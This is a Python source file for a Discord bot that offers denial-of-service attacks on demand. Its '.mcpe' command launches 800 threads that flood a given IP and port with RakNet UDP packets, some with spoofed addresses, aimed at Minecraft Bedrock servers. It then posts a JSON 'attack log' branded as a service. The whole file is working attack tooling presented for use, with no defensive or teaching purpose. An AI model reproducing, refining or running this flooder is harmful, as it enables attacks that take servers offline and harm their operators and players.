import discord
from discord.ext import commands
import socket
import threading
import time
import struct
import random

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents)

# 20 Different variants of RakNet Magic
RAKNET_MAGIC_VARIANTS = [
    b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x00\xff\xff\x00\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x00\xff\xff\x00\xfe\xfe\xfe\xff\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x00\xff\xff\x01\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x01\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x00\xff\xff\x00\xfe\xfe\xff\xff\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x02\xff\xff\x00\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x00\xff\xff\x01\xfe\xfe\xfe\xff\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x03\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x00\xff\xff\x00\xfe\xfe\xfd\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x01\xff\xff\x01\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x00\xff\xff\x00\xfe\xfe\xff\xff\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x02\xff\xff\x01\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x01\xff\xff\x00\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x03\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x00\xff\xff\x01\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x02\xff\xff\x00\xfe\xfe\xff\xff\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x01\xff\xff\x01\xfe\xfe\xfd\xfd\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    b'\x03\xff\xff\x01\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
]

def raknet_extreme(ip, port, duration):
    end_time = time.time() + duration

    def flood():
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.5)

                for magic in RAKNET_MAGIC_VARIANTS:
                    # Unconnected Ping
                    ping = b'\x01' + struct.pack('>Q', random.randint(1, 9999999999)) + magic
                    sock.sendto(ping, (ip, port))

                    # OpenConnectionRequest1
                    req1 = b'\x05' + magic + b'\x00' * 16
                    sock.sendto(req1, (ip, port))

                    # OpenConnectionRequest2 (spoofed)
                    client_id = random.randint(100000, 999999)
                    spoof_ip = socket.inet_aton(f"192.168.{random.randint(0,255)}.{random.randint(0,255)}")
                    req2 = (
                        b'\x07' + magic +
                        spoof_ip +
                        struct.pack('>H', random.randint(1000, 65535)) +
                        struct.pack('>Q', client_id) +
                        b'\x00\x10'
                    )
                    sock.sendto(req2, (ip, port))

                sock.close()
            except:
                continue

    for _ in range(800):  # Higher power
        threading.Thread(target=flood, daemon=True).start()

@bot.command()
async def mcpe(ctx, ip=None, port=None, duration=None):
    if not ip or not port or not duration:
        await ctx.send("Usage: `.mcpe <ip> <port> <duration>`")
        return

    try:
        port = int(port)
        duration = int(duration)
        if duration > 300 or port < 1 or port > 65535:
            raise ValueError
    except:
        await ctx.send("Invalid port or duration.")
        return

    raknet_extreme(ip, port, duration)

    attack_data = {
        "status": "success",
        "message": "Attack sent successfully",
        "attack_log": {
            "username": str(ctx.author),
            "service": "Apsx Services",
            "host": ip,
            "port": port,
            "time": f"{duration} seconds",
            "method": "RAKNET-FLOOD EXTREME",
            "handlers": "Node (4), Node (1)"
        }
    }

    await ctx.send("```json\n" + str(attack_data) + "\n```")

bot.run("YOUR_BOT_TOKEN")
